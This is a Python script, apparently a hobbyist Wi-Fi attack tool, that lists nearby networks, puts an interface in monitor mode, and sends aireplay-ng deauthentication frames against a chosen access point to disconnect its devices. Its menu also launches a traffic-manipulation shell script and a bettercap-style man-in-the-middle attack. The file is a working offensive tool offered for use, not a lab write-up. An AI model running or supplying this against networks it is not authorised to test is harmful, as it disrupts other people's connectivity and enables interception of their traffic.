from subprocess import run
from termcolor import colored
import sys
import argparse
import shlex
import re


parser = argparse.ArgumentParser(prog="RD", usage="Add more control to your Network.",
description="Wifi cistomiser.", epilog="__Made by redel-byte__",
formatter_class=argparse.HelpFormatter, conflict_handler='error',
add_help=True, allow_abbrev=True, exit_on_error=True)

parser.add_argument("-i","--iface=",action="store",dest="iface", default="", type=str, required=False, help="-- Manage Interface to use <wlan0...>.")
parser.add_argument("--available_interfaces",dest="ai", action="store_true", required=False, help="-- check available interfaces.")
parser.add_argument("-d","--deauth",action="store", default=10, type=int, required=False, help="-- Active deauth mode.")
parser.add_argument("-m","--mitm",action="store_true", required=False, help="-- Man in the midle atack mode.")
parser.add_argument("-t","--tc", action="store_true", required=False, help="-- Manipulate traffic controle setting.")


wifi = parser.parse_args()

class Tools:
    def __init__(self, iface, ai, deauth, mitm, tc):
        self.iface = iface
        self.ai = ai
        self.deauth = deauth
        self.mitm = mitm
        self.tc = tc
        self.bssid = ""
   
    def menu(self):
        print(" "*6+"-"*7+"Menu"+"-"*7)
        print(" "*3+"1. Remove devices for Network.")
        print(" "*3 + "2. Manipulate Trafic.")
        print(" "*3 + "3. Man in the middle atack.")
        print(" "*3+ "4. Exit.")
        print(" "*6+"-"*7+"----"+"-"*7)
        return int(input())

    def show_interfaces(self):
        return run(['ls','/sys/class/net'],capture_output=True,text=True).stdout

    def search_for_network(self):
        print("[+]Search for Network...")
        nmcli_args = shlex.split(f"nmcli d wifi list ifname {wifi.iface}")
        nmcli_output = run(nmcli_args,capture_output=True,text=True)
        elements = nmcli_output.stdout.splitlines()
        print(" "*4 + elements[0])
        for element in range(1,len(elements) ): 
            print(f"[{colored(element,"red")}] {elements[element]}\n") 
        choice = int(input("Which is your Network: "))
        mac = re.findall(r"(\w{2}:\w{2}:\w{2}:\w{2}:\w{2}:\w{2})",nmcli_output.stdout,re.IGNORECASE)
        self.bssid = mac[choice - 1]
      
    def monitormod(self):
        print("[+]Starting Monitor Mod...")
        arg = shlex.split(f"sudo airmon-ng start {self.iface}")
        result = run(arg ,text=True,capture_output=True)
        return result.returncode

    def deauthing(self):
        print("[+]Deauthing...")
        args = shlex.split(f"sudo aireplay-ng -a {self.bssid} -0 {self.deauth} {self.iface}mon")
        return run(args,capture_output=True,text=True).stdout

att = Tools(wifi.iface, wifi.ai, wifi.deauth, wifi.mitm, wifi.tc)

if __name__ == "__main__":
    if not len(wifi.iface):
        print("Which interface you're using to connecte WIFI:\n"+colored(att.show_interfaces(),"red"))
        while True:
            wifi.iface = str(input())
            if wifi.iface in str(att.show_interfaces()):
                output = att.menu()
                if 0<output<5:
                    if output ==  1:
                        att.search_for_network()
                        monitor = att.monitormod()
                        if monitor != 0 :
                            print("[!]Monitor mode dosn't start\nRun 'main.py --available_interfaces'  to see available interfaces")
                        else:
                            print("[+]Monitor mode is start.\n")
                        deauth = att.deauthing()
                    elif output == 2:
                        run(['sudo', './trafic.sh'])
                    elif output == 3:
                        run(['sudo','autobattercap'])
                    elif output == 4:
                        sys.exit(0) 
                    else:
                        print("[!]Not available Option.")
            else:
                print("[!]Unknown interface try againe.")
